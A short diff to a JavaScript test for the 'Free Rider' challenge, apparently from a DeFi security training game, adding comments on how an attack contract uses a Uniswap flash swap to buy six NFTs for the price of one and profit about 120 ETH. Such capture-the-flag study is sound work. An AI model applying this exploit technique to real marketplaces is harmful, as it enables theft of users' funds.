@@ -110,8 +110,11 @@ describe('[Challenge] Free Rider', function () {
         const FreeRiderAttackFactory = await ethers.getContractFactory('FreeRiderAttack', attacker);
         this.attackContract = await FreeRiderAttackFactory.connect(attacker).deploy(this.marketplace.address, this.buyerContract.address);
         
+        // execute attack contract which buys all 6 NFTs (IDs: 0 to 5) for the price of one (using a flash swap to get the
+        // required ETH) and hands them over to the buyer
         await this.attackContract.connect(attacker).attack(this.uniswapPair.address, NFT_PRICE, [0, 1, 2, 3, 4, 5]);
         
+        // the attacker now has a balance of at least BUYER_PAYOUT + 5*NFT_PRICE = 120 ETH
         console.log("Attacker:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH");
     });
 
